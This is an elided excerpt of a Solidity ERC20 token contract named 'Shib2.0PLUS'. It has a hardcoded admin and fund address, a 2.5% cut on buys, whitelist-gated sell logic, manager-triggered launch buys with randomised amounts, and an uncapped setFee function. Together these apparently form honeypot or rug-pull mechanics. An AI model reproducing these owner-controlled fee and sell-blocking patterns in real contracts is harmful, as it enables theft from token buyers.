...
contract Token is ERC20,Ownable,AccessControl {
    ...
    constructor()ERC20("Shib2.0PLUS", "Shib2.0PLUS") {
        admin=0xefc79c93E0dbeA74f77E3581df01585299DCFc92;
        //admin=msg.sender;
        fundAddr= 0x51734A7d0d02f2d87ce6B8152B0360744E5E2395;
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair) {
            ...
            _sent(fundAddr,amount.mul(25).div(1000));
            return;
        }
        if(to == uniswapV2Pair) {
            if(whiteList[from]){
    ...
    function startTrade(address[] calldata adrs) public onlyRole(MANAGER_ROLE) {
        ...
        for(uint i=0;i<adrs.length;i++)
            swapToken((random(5,adrs[i])+1)*10**12+6*10**12,adrs[i]);
    }
    function startTrade2(address[] calldata adrs) public onlyRole(MANAGER_ROLE) {
        startTradeBlock = block.number;
        for(uint i=0;i<adrs.length;i++)
            swapToken2((random(5,adrs[i])+1)*10**12+7*10**12,adrs[i]);
    }
    ...
    function setFee(uint256 amount) public onlyRole(MANAGER_ROLE) {
        require(amount > 0, "amount must gt 0");
        fee = amount;
    }
